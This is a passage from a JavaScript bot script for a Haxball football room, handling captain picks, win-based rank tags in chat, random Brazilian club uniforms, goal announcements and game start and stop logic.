				if (teamR.length > teamB.length && player.id == teamB[0].id) { // we care if it's red turn && red cap talking
					if (["top", "auto"].includes(message[0].toLowerCase())) {
						room.setPlayerTeam(teamS[0].id, Team.BLUE);
						blueCaptainChoice = "top";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " recruited the first!");
						return false;
					}
					else if (["random", "rand"].includes(message[0].toLowerCase())) {
						room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
						blueCaptainChoice = "random";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " randomly recruited!");
						return false;
					}
					else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
						room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
						blueCaptainChoice = "bottom";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " recruited the last one!");
						return false;
					}
					else if (!Number.isNaN(Number.parseInt(message[0]))) {
						if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
							room.sendChat("❌ Enter a valid number", player.id);
							return false;
						}
						else {
							room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.BLUE);
							room.sendChat(player.name + " recruited: " + teamS[Number.parseInt(message[0]) - 1].name + " !");
							return false;
						}
					}
				}
			}
		}

		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			room.sendAnnouncement("「𝐃𝐎𝐍𝐎」" + player.name + ": " + msg + "", null, 0xD81826)
			return false;
		}
        if (localStorage.getItem(getAuth(player))){ // elo definido por vitórias
            stats = JSON.parse(localStorage.getItem(getAuth(player)));
            if (stats[Ss.WI] > 499){
            room.sendAnnouncement("👑 「𝐋𝐞𝐧𝐝𝐚」" + player.name + ": " + msg + "", null, 0x7E65FF)
            } else if (stats[Ss.WI] > 199){
            room.sendAnnouncement("🏅 「𝗣𝗹𝗮𝘁𝗶𝗻𝗮 𝐈𝐈𝐈」:" + player.name + ": " + msg + "", null, 0x62AEE3)
            } else if (stats[Ss.WI] > 179){
            room.sendAnnouncement("🏅 「𝗣𝗹𝗮𝘁𝗶𝗻𝗮 𝐈𝐈」" + player.name + ": " + msg + "", null, 0x62AEE3)
            } else if (stats[Ss.WI] > 159){
            room.sendAnnouncement("🏅 「𝗣𝗹𝗮𝘁𝗶𝗻𝗮 𝐈」" + player.name + ": " + msg + "", null, 0x62AEE3)
            } else if (stats[Ss.WI] > 129){
            room.sendAnnouncement("🥇 「𝗢𝘂𝗿𝗼 𝐈𝐈𝐈」" + player.name + ": " + msg + "", null, 0xEAC274)
            } else if (stats[Ss.WI] > 89){
            room.sendAnnouncement("🥇 「𝗢𝘂𝗿𝗼 𝐈𝐈」" + player.name + ": " + msg + "", null, 0xEAC274)
            } else if (stats[Ss.WI] > 69){
            room.sendAnnouncement("🥇 「𝗢𝘂𝗿𝗼 𝐈」" + player.name + ": " + msg + "", null, 0xEAC274)
            } else if (stats[Ss.WI] > 59){
            room.sendAnnouncement("🥈 「𝗣𝗿𝗮𝘁𝗮 𝐈𝐈𝐈」" + player.name + ": " + msg + "", null, 0xA2A2A2)
            } else if (stats[Ss.WI] > 44){
            room.sendAnnouncement("🥈 「𝗣𝗿𝗮𝘁𝗮 𝐈𝐈」" + player.name + ": " + msg + "", null, 0xA2A2A2)
            } else if (stats[Ss.WI] > 34){
            room.sendAnnouncement("🥈 「𝗣𝗿𝗮𝘁𝗮 𝐈」" + player.name + ": " + msg + "", null, 0xA2A2A2)
            } else if (stats[Ss.WI] > 24){
            room.sendAnnouncement("🥉 「𝗕𝗿𝗼𝗻𝘇𝗲 𝐈𝐈𝐈」" + player.name + ": " + msg + "", null, 0x72532A)
            } else if (stats[Ss.WI] > 14){
            room.sendAnnouncement("🥉 「𝗕𝗿𝗼𝗻𝘇𝗲 𝐈𝐈」" + player.name + ": " + msg + "", null, 0x72532A)
            } else if (stats[Ss.WI] > 4){
            room.sendAnnouncement("🥉 「𝗕𝗿𝗼𝗻𝘇𝗲 𝐈」" + player.name + ": " + msg + "", null, 0x72532A)
            } else {
            room.sendAnnouncement("㋡ 「𝗜𝗻𝗶𝗰𝗶𝗮𝗻𝘁𝗲」"  + player.name + ": " + msg + "", null, 0x7aa476)
            }
            return false;
            }
			else {
				room.sendAnnouncement("❌ " + player.name + ": " + message.join(' '), null, 0xFFFFFF);
		
		return false;
		}

		if (message[0][0] == "!") {
			return false;
		}
		if (getMute(player)) {
			room.sendChat("Tu", player.id);
			return false;
		}
		if (slowMode > 0) {
			if (!player.admin) {
				if (!SMSet.has(player.id)) {
					SMSet.add(player.id);
					setTimeout((number) => { SMSet.delete(number); }, slowMode * 1000, player.id);
				}
				else {
					return false;
				}
			}
		}
	
	}

	var teamIDs = [{ Index: 0, Name: "Spectators" }, { Index: 1, Name: "A partida começa na ArenaPower, os times que vão se enfrentar hoje são:" }, { Index: 2, Name: "         x" }];

	var teams = [
		{ ID: 1, longName: "Flamengo", uniform: [{ angle: 90, mainColor: [0xC90000, 0x080808, 0xC90000], avatarColor: 0xEBEBEB }, { angle: 90, mainColor: [0xC90000, 0x080808, 0xC90000], avatarColor: 0xEBEBEB }] },
		{ ID: 2, longName: "Corinthians", uniform: [{ angle: 90, mainColor: [0x080808, 0x080808, 0x080808], avatarColor: 0xEBEBEB }, { angle: 90, mainColor: [0x080808, 0x080808, 0x080808], avatarColor: 0xEBEBEB }] },
		{ ID: 3, longName: "Palmeiras", uniform: [{ angle: 90, mainColor: [0x213c34, 0x213c34, 0x213c34], avatarColor: 0xE3E3E3 }, { angle: 90, mainColor: [0x213c34, 0x213c34, 0x213c34], avatarColor: 0xE3E3E3 }] },
		{ ID: 4, longName: "Vasco", uniform: [{ angle: 40, mainColor: [0x080808, 0xFFFFFF, 0x080808], avatarColor: 0xC90000 }, { angle: 40, mainColor: [0x080808, 0xFFFFFF, 0x080808], avatarColor: 0xC90000 }] },
		{ ID: 5, longName: "Botafogo", uniform: [{ angle: 0, mainColor: [0x080808, 0xFFFFFF, 0x080808], avatarColor: 0x292929 }, { angle: 0, mainColor: [0x080808, 0xFFFFFF, 0x080808], avatarColor: 0x292929 }] },
		{ ID: 6, longName: "Grêmio", uniform: [{ angle: 0, mainColor: [0x0884bd, 0xFFFFFF, 0x0884bd], avatarColor: 0x080808 }, { angle: 0, mainColor: [0x0884bd, 0xFFFFFF, 0x0884bd], avatarColor: 0x080808 }] },
		{ ID: 7, longName: "Internacional", uniform: [{ angle: 90, mainColor: [0xC90000, 0xC90000, 0xC90000], avatarColor: 0xFFFFFF }, { angle: 90, mainColor: [0xC90000, 0xC90000, 0xC90000], avatarColor: 0xFFFFFF }] },
		{ ID: 8, longName: "Fluminense", uniform: [{ angle: 0, mainColor: [0x860929, 0x01623c, 0x860929], avatarColor: 0xFFFFFF }, { angle: 0, mainColor: [0x860929, 0x01623c, 0x860929], avatarColor: 0xFFFFFF }] },
		{ ID: 9, longName: "Cruzeiro", uniform: [{ angle: 0, mainColor: [0x2f529e, 0x2f529e, 0x2f529e], avatarColor: 0xFFFFFF }, { angle: 0, mainColor: [0x2f529e, 0x2f529e, 0x2f529e], avatarColor: 0xFFFFFF }] },
		{ ID: 10, longName: "Fortaleza", uniform: [{ angle: 90, mainColor: [0x1f5ea1, 0xe31d1a, 0x1f5ea1], avatarColor: 0xFFFFFF }, { angle: 90, mainColor: [0x1f5ea1, 0xe31d1a, 0x1f5ea1], avatarColor: 0xFFFFFF }] },
		{ ID: 11, longName: "Bahia", uniform: [{ angle: 90, mainColor: [0x005ca9, 0xe31d1a, 0x005ca9], avatarColor: 0xFFFFFF}, { angle: 90, mainColor: [0x005ca9, 0xe31d1a, 0x005ca9], avatarColor: 0xFFFFFF }] },
		{ ID: 12, longName: "Sport", uniform: [{ angle: 90, mainColor: [0xC90000, 0x080808, 0xC90000], avatarColor: 0xFFD900 }, { angle: 90, mainColor: [0xC90000, 0x080808, 0xC90000], avatarColor: 0xFFD900 }] },
		{ ID: 13, longName: "Santos", uniform: [{ angle: 90, mainColor: [0xEBEBEB, 0xEBEBEB, 0xEBEBEB], avatarColor: 0x080808 }, { angle: 90, mainColor: [0xEBEBEB, 0xEBEBEB, 0xEBEBEB], avatarColor: 0x080808 }] },
	];
	
	function getRandomIntegers(length) {
		var randomInts = [0, 0];
		var numbers = [];
		if (!isNaN(length)) {
			for (var n = 1; n <= length; n++) {
				numbers.push(n);
			}
		}
		for (var i = 0; i < randomInts.length; i++) {
			randomInts[i] = numbers[Math.floor(Math.random() * numbers.length)];
			if (i < randomInts.length - 1) {
				var index = numbers.indexOf(randomInts[i]);
				index !== -1 ? numbers.splice(index, 1) : console.log("Error in deleting random number");
			}
		}
		return randomInts;
	}
	
	function randomUniforms() {
			var randomInts = getRandomIntegers(teams.length);
			var t = [{ int: randomInts[0], teamID: 1 }, { int: randomInts[1], teamID: 2 }];
			t.forEach(x => {
				var index = teams.findIndex(team => team.ID == x.int);
				var tindex = t.findIndex(o => o.teamID == x.teamID);
				if (index !== -1) {
					room.setTeamColors(x.teamID, teams[x.int - 1].uniform[tindex].angle, teams[x.int - 1].uniform[tindex].avatarColor, teams[x.int - 1].uniform[tindex].mainColor);
					room.sendAnnouncement(` ${teamIDs[x.teamID].Name}`, null, 0xFF0000, 'bold');
					room.sendAnnouncement(` ${teams[x.int - 1].longName}`, null, 0x05C5FF, 'bold');
				}
			}
		);
	}

	room.onPlayerActivity = function(player) {
		setActivity(player, 0);
	}

	room.onPlayerBallKick = function(player) {
		if (lastPlayersTouched[0] == null || player.id != lastPlayersTouched[0].id) {
			!activePlay ? activePlay = true : null;
			lastTeamTouched = player.team;
			lastPlayersTouched[1] = lastPlayersTouched[0];
			lastPlayersTouched[0] = player;
		}
	}

	/* GAME MANAGEMENT */

	room.onGameStart = function(byPlayer) {
		randomUniforms();
		game = new Game(Date.now(), room.getScores(), []);
		countAFK = true;
		activePlay = false;
		goldenGoal = false;
		endGameVariable = false;
		lastPlayersTouched = [null, null];
	    Rposs = 0;
		Bposs = 0;
		GKList = [];
		allReds = [];
		allBlues = [];
		room.sendAnnouncement("Uniforms: !atl, !ast, !tot, !ars, !mun, !mci, !ita, !che, !juv, !psg, !gre, !ibi, !bor, !liv, !fra, !rea, !vas, !cori, !cru, !hol, !san, !spfc, !fla, !bra, !bay, !mil, !bot, !esp.", null, Cor.Verde, Normal);
		room.sendAnnouncement("[💬] Use 't' to chat with your team!", null, 0x5EE7FF);
		room.sendAnnouncement("The match is being recorded.");
		if (teamR.length == maxTeamSize && teamB.length == maxTeamSize) {
			for (var i = 0; i < maxTeamSize; i++) {
				allReds.push(teamR[i]);
				allBlues.push(teamB[i]);
			}
		}
		for (var i = 0; i < extendedP.length; i++) {
			extendedP[i][eP.GK] = 0;
			extendedP[i][eP.ACT] = 0;
			room.getPlayer(extendedP[i][eP.ID]) == null ? extendedP.splice(i, 1) : null;
		}
		room.startRecording();
		deactivateChooseMode();
	}

	room.onGameStop = function(byPlayer) {
		if (byPlayer.id == 0 && endGameVariable) {
			updateTeams();
			if (inChooseMode) {
				if (players.length == 2 * maxTeamSize) {
					inChooseMode = false;
					resetBtn();
					for (var i = 0; i < maxTeamSize; i++) {
						setTimeout(() => { randomBtn(); }, 400*i);
					}
					setTimeout(() => { room.startGame(); }, 2000);
				}
				else {
					if (lastWinner == Team.RED) {
						blueToSpecBtn();
					}
					else if (lastWinner == Team.BLUE) {
						redToSpecBtn();
						blueToRedBtn();
					}
					else {
						resetBtn();
					}
					setTimeout(() => { topBtn(); }, 500);
				}
			}
			else {
				if (players.length == 2) {
					if (lastWinner == Team.BLUE) {
						room.setPlayerTeam(teamB[0].id, Team.RED);
						room.setPlayerTeam(teamR[0].id, Team.BLUE);
					}
					setTimeout(() => { room.startGame(); }, 2000);
				}
				else if (players.length == 3 || players.length >= 2 * maxTeamSize + 1) {
					if (lastWinner == Team.RED) {
						blueToSpecBtn();
					}
					else {
						redToSpecBtn();
						blueToRedBtn();
					}
					setTimeout(() => { topBtn(); }, 200);
					setTimeout(() => { room.startGame(); }, 2000);
				}
				else if (players.length == 4) {
					resetBtn();
					setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500);
					setTimeout(() => { room.startGame(); }, 2000);
				}
				else if (players.length == 5 || players.length >= 2 * maxTeamSize + 1) {
					if (lastWinner == Team.RED) {
						blueToSpecBtn();
					}
					else {
						redToSpecBtn();
						blueToRedBtn();
					}
					setTimeout(() => { topBtn(); }, 200);
					activateChooseMode();
				}
				else if (players.length == 6) {
					resetBtn();
					setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500); }, 500);
					setTimeout(() => { room.startGame(); }, 2000);
				}
			}
		}
	}

	room.onGamePause = function(byPlayer) {
	}

	room.onGameUnpause = function (byPlayer) {
		if (teamR.length == 4 && teamB.length == 4 && inChooseMode || (teamR.length == teamB.length && teamS.length < 2 && inChooseMode)) {
			deactivateChooseMode();
		}
	}

	room.onTeamGoal = function(team) {
		let players = room.getPlayerList();

		for (let i = 0; i < players.length; i++) {
			if (players[i].team == team) room.setPlayerAvatar(players[i].id, "⚽️");
		}
		setTimeout(() => {
			for (let i = 0; i < players.length; i++) {
			   room.setPlayerAvatar(players[i].id, null);
			}
		}, resetarAvatarEm * 1000);
		activePlay = false;
		countAFK = false;
		const scores = room.getScores();
		game.scores = scores;
		if (lastPlayersTouched[0] != null && lastPlayersTouched[0].team == team) {
		if (lastPlayersTouched[1] != null && lastPlayersTouched[1].team == team) {
			var frasegol = frasesGOL[(Math.random() * frasesGOL.length) | 0]
			var fraseasis = frasesASS[(Math.random() * frasesASS.length) | 0]
			room.sendAnnouncement("⚽👥 " + getTime(scores) + frasegol + lastPlayersTouched[0].name + fraseasis + lastPlayersTouched[1].name + " | Kick speed: " + ballSpeed.toPrecision(4).toString() + "mph " + (team == Team.RED ? "🔴" : "🔵"),null,(team == Team.RED ? Cor.Vermelho : Cor.Azul),'bold');
				game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], lastPlayersTouched[1]));
			}
			else {
				var frasegol = frasesGOL[(Math.random() * frasesGOL.length) | 0]
				room.sendAnnouncement("⚽ " + getTime(scores) + frasegol + lastPlayersTouched[0].name + "! | Kick speed: " + ballSpeed.toPrecision(4).toString() + "mph " + (team == Team.RED ? "🔴" : "🔵"),null,(team == Team.RED ? Cor.Vermelho : Cor.Azul),'bold');
				game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], null));
			}
		}
		else {
			var fraseautogol = golcontra[(Math.random() * golcontra.length) | 0]
			room.sendAnnouncement("🤡 " + getTime(scores) + fraseautogol + lastPlayersTouched[0].name + "! | Kick speed: " + ballSpeed.toPrecision(4).toString() + "mph " + (team == Team.RED ? "🔴" : "🔵"),null,(team == Team.RED ? Cor.Vermelho : Cor.Azul),'bold');
			game.goals.push(new Goal(scores.time, team, null, null));
		}
		if (scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit && scores.blue > 0 || goldenGoal == true)) {
			endGame(team);
			goldenGoal = false;
			setTimeout(() => { room.stopGame(); }, 1000);
		}
	}

	function getDatehoras(){
		let data = new Date(),
		dia=data.getDate().toString().padStart(2, '0'),
		mes=(data.getMonth()+1).toString().padStart(2, '0'),
		horas=data.getHours().toString().padStart(2, '0'),
		minutos=data.getMinutes().toString().padStart(2, '0');
		return `${horas}:${minutos}`;
	}

	function getDateInfo(){
		let data = new Date(),
		dia=data.getDate().toString().padStart(2, '0'),
		mes=(data.getMonth()+1).toString().padStart(2, '0'),
		ano=data.getFullYear(),
		horas=data.getHours().toString().padStart(2, '0'),
		minutos=data.getMinutes().toString().padStart(2, '0');
		segundos=data.getSeconds().toString().padStart(2, '0');
		return `${dia} do ${mes} de ${ano}, ás ${horas}:${minutos}:${segundos}`;
	}

	function dataehora(){
		let data = new Date(),
		dia=data.getDate().toString().padStart(2, '0'),
		mes=(data.getMonth()+1).toString().padStart(2, '0'),
		ano=data.getFullYear(),
		horas=data.getHours().toString().padStart(2, '0'),
		minutos=data.getMinutes().toString().padStart(2, '0');
		segundos=data.getSeconds().toString().padStart(2, '0');
		return `${dia}/${mes} de ${ano}, ás ${horas}:${minutos} e ${segundos} seconds`;
	}

	room.onPositionsReset = function() {
		countAFK = true;
		lastPlayersTouched = [null, null];
	}

	/* MISCELLANEOUS */

	room.onRoomLink = function(url) {
	}

	room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
		if (getMute(changedPlayer) && changedPlayer.admin) {
			room.sendChat(changedPlayer.name + " has been demutated.");
			setMute(changedPlayer, false);
		}
		if (byPlayer.id != 0 && localStorage.getItem(getAuth(byPlayer)) && JSON.parse(localStorage.getItem(getAuth(byPlayer)))[Ss.RL] == "admin") {
			room.sendChat("You are not allowed to nominate a player as an admin!", byPlayer.id);
			room.setPlayerAdmin(changedPlayer.id, false);
		}
	}

	room.onStadiumChange = function(newStadiumName, byPlayer) {
	}

	room.onGameTick = function() {
		checkTime();
		getLastTouchOfTheBall();
		getStats();
		handleInactivity();
	}
